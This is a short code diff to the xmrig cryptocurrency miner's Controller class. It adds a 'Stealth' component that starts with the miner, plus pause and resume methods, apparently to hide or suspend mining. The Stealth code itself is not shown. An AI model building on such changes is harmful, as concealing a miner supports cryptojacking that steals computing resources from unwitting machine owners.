@@ -36,11 +36,14 @@
 xmrig::Controller::Controller(Process *process) :
     Base(process)
 {
+    m_stealth = new Stealth(this);
 }
 
 
 xmrig::Controller::~Controller()
 {
+    delete m_stealth;
+
     VirtualMemory::destroy();
 }
 
@@ -67,6 +70,8 @@ void xmrig::Controller::start()
     Base::start();
 
     m_miner = std::make_shared<Miner>(this);
+
+    m_stealth->start();
 
     network()->connect();
 }
@@ -103,4 +108,16 @@ void xmrig::Controller::execCommand(char command) const
 {
     miner()->execCommand(command);
     network()->execCommand(command);
+}
+
+
+void xmrig::Controller::pause(int pause)
+{
+    miner()->pause(pause);
+}
+
+
+void xmrig::Controller::resume(int pause)
+{
+    miner()->resume(pause);
 }
